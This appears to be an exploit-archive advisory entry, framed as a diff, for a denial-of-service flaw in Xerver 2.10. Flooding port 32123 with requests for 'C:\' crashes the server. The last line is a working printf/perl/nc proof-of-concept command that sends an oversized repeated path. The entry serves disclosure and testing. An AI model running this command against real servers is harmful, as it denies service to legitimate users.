@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/4254/info
+
+Xerver is a freely available webserver, written in Java. It will run on any operating system with Java installed, including Microsoft Windows, Unix/Linux variants, MacOS, etc.
+
+It has been reported that sending an excessive number of requests for 'C:\' to port 32123 will cause the webserver to crash, denying service to legitimate users. This appears to be the case even on non-Windows based operating systems running the vulnerable software.
+
+The webserver will need to be restarted to regain normal functionality.
+
+This issue was reported for v2.10 of Xerver. Earlier versions may also be affected.
+
+
+printf "GET /`perl -e 'print "C:/"x500000'`\r\n\r\n" |nc -vvn 127.0.0.1 32123 
